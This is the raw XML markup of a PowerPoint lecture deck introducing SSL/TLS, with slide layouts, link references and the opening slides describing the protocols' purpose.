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6.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide6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43.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/theme/theme3.xml" ContentType="application/vnd.openxmlformats-officedocument.them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4.xml" ContentType="application/vnd.openxmlformats-officedocument.theme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theme/theme6.xml" ContentType="application/vnd.openxmlformats-officedocument.theme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55.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide52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slides/slide58.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties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65.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slideMasters/slideMaster4.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide56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ppt/slideMasters/slideMaster3.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/>
  <Override PartName="/ppt/slides/slide23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6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slides/slide61.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.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63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6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57.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide54.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide59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60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</p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId77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</p:sldIdLst>
  <p:sldSz cx="9144000" cy="6858000" type="screen4x3"/>
  <p:notesSz cx="7559675" cy="10691813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6" d="100"/>
          <a:sy n="116" d="100"/>
        </p:scale>
        <p:origin x="216" y="-104"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide pos="288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theme" Target="theme/theme1.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme2.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme3.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme4.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme5.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme6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 /><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyles.xml" /><Relationship Id="rId8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EF5E0E-6566-C96C-ECA0-3CBE7F1219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89792-D9FF-A1CB-FCD1-F412DD166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36563-0845-353C-5A40-8AADFEF113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D02113-FE39-FBEA-4A11-0DE908F7AA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AD358A-9F96-502B-8970-84A4B7E333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3488C6-B711-1CD1-F771-E17A44942A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DDB29-9C97-8FE6-C8E5-5313EB2A67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E9CA3-69BC-2767-9C76-63338BD51F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827C1-C27C-ABE0-ACB7-38EE856D14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E2BFEC-5EFF-8A4E-C2D1-080C18DE85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95BC4F-8501-45D6-33F0-56623382C1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29A0D5-6E99-435A-8B19-7C765700E1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D67AB-C846-63F0-834C-9885FB99A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9E68C-611D-6C82-4677-F8504246FC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39A1D7-BFAD-E548-9DD3-172A5D8DE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32C96-CD85-D6A0-64ED-932C69DAF0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4C8CC-3991-09BD-A23C-1263DBCB74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FA029A-1BE3-1261-21AE-3F7C4B0FB4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AF18D-7308-0CAF-F5A1-BD854E5251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3E793-834E-D4A7-FD65-11AE1F172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A615B3-087D-3680-171B-C593E84DC1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D3558-80F1-502A-CCA1-ACCE300FBB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60E313-BC12-1E0E-92C3-D3BD304625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89E1F7-70ED-2C2D-BEDF-9148DB3E4C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95A5F-EB10-87BD-923A-AB19BFBD27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0E5EC-7EA4-1D0C-6AA6-80CEEF1979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29B82-A5E8-430A-097C-520BFAB79E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96EA10-1A7B-4F5B-A46B-B50B3473AE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421EC0-C0B6-7F97-F7D8-D980D122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0E3784-3EE9-9C83-82F2-897E44EBB7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E14DA4-31AB-7511-A924-B06D204C4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F6291D-58E1-7C80-6A27-92B732842E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497102-74B4-3A97-0385-29ABD4F42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E2F45-9E0B-210A-FBF5-24C3790D75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89B9A1-B0CB-46A8-A770-08C35AA69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82032-0220-970B-E977-76011A2C15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AE1D8-F1CD-3007-DAF0-CCB53DFEED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C4F320-BABF-04D4-0BAB-16D80F7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A80675-658F-44D1-0CEC-843A52BA9A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69FF8-F846-E994-9A8D-E2FBB6A170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1622A6-05B4-7C04-EEF4-D386F4B1C5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FDABDC-8DF5-B636-49C3-304DF281EF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9446C0-1217-EDC0-B8FE-8DB0D17C3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DBB783-2B41-96DE-7101-2611D14E06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D180F3-19FF-30A7-F7FC-E6204C8BC7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16CE43-B998-5F74-1052-C20FC610E0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7C3BF-5270-B8D4-5E8B-72FE0A0368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24FF3C-0704-B4CD-9FAF-C3A4E420E3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FDD33B-473A-E511-FB21-64410CF7C1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0C22C7-ECFC-B54D-D427-ED045B683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7DBC8-BF68-0FE0-466E-4F4381B29E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921333-3913-E8F4-10FE-31A186B297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227B0C-674A-58E5-77BD-5A0AA35D2B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6FC6F-84DE-6B6C-3FCD-6DA173A8FD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6098A-2AFD-2822-5619-8338731097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BFD93-3AA5-73A0-27E4-B5F0157D4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3F2E1-A139-97AA-305C-17D87BCFD8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11F02F-9750-7127-5F77-C3C4BAA1C9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B49E0C-6355-C363-B1D6-5EAD33596E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8E6B6-7F71-9551-FC45-C5C6661169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BE4761-D58F-C0AE-3D16-028C141CFA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715373-579E-A300-61B6-7AC1B9D736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D9477D-60DE-91E5-41DD-C04F19DEA4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F25175-06D7-70F0-8AF1-AB2235DC4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B3A18F-A6B2-DF11-964E-B0621E298D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41143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8955374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8337993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9170467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57364F08-8E98-43EB-8944-013AB958C107}" type="slidenum">
              <a:rPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1473961045" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="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4093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8899717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590130" name="PlaceHolder 3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72391139" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt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47704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959085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0517216" name="PlaceHolder 3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76227917" name="PlaceHolder 4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>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{E5ED16BC-77A7-4349-B795-808001C6BF69}" type="slidenum">
              <a:rPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1898358107" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="8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81610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3328788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2590337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91778108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fld id="{6C735383-2543-4BC5-B681-F69F73294ADE}" type="slidenum">
              <a:rPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1333681075" name="PlaceHolder 5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95436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7871667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228904" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="1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37665919" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{97AF681D-0D10-43A8-9382-BD605439C200}" type="slidenum">
              <a:rPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1119195637" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="1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64173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5357160" cy="121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  <a:defRPr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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1106899329" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="809830629" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="977496467" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8443440" y="6478560"/>
            <a:ext cx="588960" cy="25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37E0F27-0140-469A-88D4-A9BD094FC1F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353699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3118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  <a:defRPr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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="570274106" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1556640"/>
            <a:ext cx="7235640" cy="18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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1354464634" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="435540138" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="202337928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443440" y="6478560"/>
            <a:ext cx="588960" cy="25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9E42659D-2021-497C-A244-D106F99725B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6952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  <a:defRPr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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159034491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577520"/>
            <a:ext cx="3977280" cy="970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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="539314975" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4709160" y="1577520"/>
            <a:ext cx="3977280" cy="970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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="633818470" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1806078168" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="8"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1842637434" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="9"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8443440" y="6478560"/>
            <a:ext cx="588960" cy="25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05D49E33-F305-4151-8E90-301674F1BEFF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17725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63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  <a:defRPr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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1946419029" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="201115929" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1731570589" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8443440" y="6478560"/>
            <a:ext cx="588960" cy="25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1651A970-E6CC-40E2-9791-E57E7E283E3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775233" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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933279" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3108960" y="6378120"/>
            <a:ext cx="292572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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="675614297" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1289047257" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8443440" y="6478560"/>
            <a:ext cx="588960" cy="25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524989B-9EF6-4D90-8ADB-FC456AEE0645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thc.org/thc-ssl-dos/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site.com/script.js" TargetMode="Externa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jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image28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jp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foo.com/" TargetMode="Externa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www.bank.com/accounts/login.php?q=me" TargetMode="Externa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jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.freedom-to-tinker.com/blog/sjs/web-browser-security-" TargetMode="Externa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bank.com/" TargetMode="Externa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jp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3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13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6.jp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png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image58.jp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0.jp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jp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2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2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940614574" name="Rectangle 4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5303889" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="628650" y="451381"/>
            <a:ext cx="7884414" cy="4066540"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12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5700" b="0" strike="noStrike" spc="-1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SSL/TLS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5700" b="0" strike="noStrike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04313326" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="628649" y="4983276"/>
            <a:ext cx="7884414" cy="1126680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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*Slides</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike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borrowed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike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2400" b="0" strike="noStrike" spc="-72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Vitaly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike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0" strike="noStrike" spc="-1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Shmatikov</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-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5420331" name="sketch line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stroke="1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fill="norm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424262939" name="Rectangle 5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15630" name="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600" indent="0">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4700" b="0" strike="noStrike" spc="-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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4700" b="0" strike="noStrike" spc="-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b="0" strike="noStrike" spc="-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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4700" b="0" strike="noStrike" spc="-3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b="0" strike="noStrike" spc="-1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SSL/TLS?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4700" b="0" strike="noStrike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89497824" name="sketch line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stroke="1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fill="norm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90368282" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="628650" y="1929384"/>
            <a:ext cx="7886700" cy="4251960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="345960" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="51"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="345960" algn="l"/>
                <a:tab pos="354960" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>	Secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-86"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Sockets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-86"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Layer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-86"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-26"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Transport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-97"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Layer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-97"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Security</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-11"/>
              <a:t>protocols</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
          </a:p>
          <a:p>
            <a:pPr marL="754920" lvl="1" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="499"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="754920" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>design,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>different</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>crypto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-32"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-11"/>
              <a:t>algorithms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
          </a:p>
          <a:p>
            <a:pPr marL="354960" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="621"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="354960" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>De</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-72"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>facto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-66"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>standard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-72"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-66"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Internet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-66"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-11"/>
              <a:t>security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
          </a:p>
          <a:p>
            <a:pPr marL="749160" lvl="1" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="660"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="749160" algn="l"/>
                <a:tab pos="754920" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>	“The</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-21"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>primary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-21"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-21"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-15"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-21"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>TLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-15"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-21"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-15"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-21"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-11"/>
              <a:t>provide </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>privacy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-41"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>data</a:t>
            </a:r>
